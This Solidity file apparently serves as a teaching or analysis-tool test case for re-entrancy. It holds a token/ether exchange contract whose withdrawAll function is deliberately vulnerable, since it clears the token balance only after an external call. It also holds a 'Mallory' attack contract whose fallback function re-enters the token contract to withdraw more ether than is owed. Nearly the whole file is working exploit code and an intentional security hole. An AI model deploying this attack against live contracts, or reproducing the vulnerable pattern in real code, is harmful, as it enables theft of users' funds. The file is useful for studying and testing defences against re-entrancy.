pragma solidity ^0.5.0;
/*pragma solidity ^0.4.19;*/

contract Token {

    // This contract keeps track of two balances for it's users. A user can
    // send ether to this contract and exchange ether for tokens and vice
    // versa, given a varying exchange rate (currentRate).
    mapping (address => uint) tokenBalance;
    mapping (address => uint) etherBalance;
    uint currentRate;

    constructor() public {
    // for solidity 0.4.19
    /*function Token() public {*/
        currentRate = 2;
    }

    // This contract supports various utility functions for transferring,
    // exchanging Ether and Tokens.
    // Note that this probably makes it rather hard for symbolic execution
    // tools to execute all combinations of possible re-entry points.
    
    function getTokenCountFor(address x) public view returns(uint) {
        return tokenBalance[x];
    }
    function getEtherCountFor(address x) public view returns(uint) {
        return etherBalance[x];
    }
    
    function getTokenCount() public view returns(uint) {
        return tokenBalance[msg.sender];
    }

    function depositEther() public payable {
        if (msg.value > 0) { etherBalance[msg.sender] += msg.value; }
    }

    function exchangeTokens(uint amount) public {
        if (tokenBalance[msg.sender] >= amount) {
            uint etherAmount = amount * currentRate;
            etherBalance[msg.sender] += etherAmount;
            tokenBalance[msg.sender] -= amount;
        }
    }

    function exchangeEther(uint amount) public payable {
        etherBalance[msg.sender] += msg.value;
        if (etherBalance[msg.sender] >= amount) {
            uint tokenAmount = amount / currentRate;
            etherBalance[msg.sender] -= amount;
            tokenBalance[msg.sender] += tokenAmount;
        }
    }
    function transferToken(address to, uint amount) public {
        if (tokenBalance[msg.sender] >= amount) {
            tokenBalance[to] += amount;
            tokenBalance[msg.sender] -= amount;
        }
    }
    
    // This is the function that will be abused by the attacker during the
    // re-entrancy attack
    function exchangeAndWithdrawToken(uint amount) public {
        if (tokenBalance[msg.sender] >= amount) {
            uint etherAmount = tokenBalance[msg.sender] * currentRate;
            tokenBalance[msg.sender] -= amount;
            // safe because it uses the gas-limited transfer function, which
            // does not allow further calls.
            msg.sender.transfer(etherAmount);
        }
    }

    // Function vulnerable to re-entrancy attack
    function withdrawAll() public {
        uint etherAmount = etherBalance[msg.sender];
        uint tokenAmount = tokenBalance[msg.sender];
        if (etherAmount > 0 && tokenAmount > 0) {
            uint e = etherAmount + (tokenAmount * currentRate);

            // This state update acts as a re-entrancy guard into this function.
            etherBalance[msg.sender] = 0;

            // external call. The attacker cannot re-enter withdrawAll, since
            // etherBalance[msg.sender] is already 0.
            msg.sender.call.value(e)("");

            // problematic state update, after the external call.
            tokenBalance[msg.sender] = 0;
        }
    }
}

// attack contract
contract Mallory {
    Token t;
    // this is used to stop the re-entrancy after the second time the Token
    // contract sends Ether to the Mallory contract.
    bool private abort;
    
    constructor(Token _t) public {
    // for solidity 0.4.19
    /*function Mallory(Token _t) public {*/
        t = _t;
        abort = false;
    }
    
    function deposit() public payable {}
    
    function setup() public payable {
        // exchange nearly all available ether to tokens
        uint avail = address(this).balance - 2;
        t.exchangeEther.value(avail)(avail);
        // deposit the last remaining ether
        t.depositEther.value(address(this).balance)();
    }
    
    function attack() public payable {
        // call vulnerable withdrawAll
        t.withdrawAll();
    }
    
    function () external payable {
        if (!abort) {
            // stop the second re-entrancy, which is caused by the transfer
            abort = true;  
            t.exchangeAndWithdrawToken(t.getTokenCount());
        }
    }
}
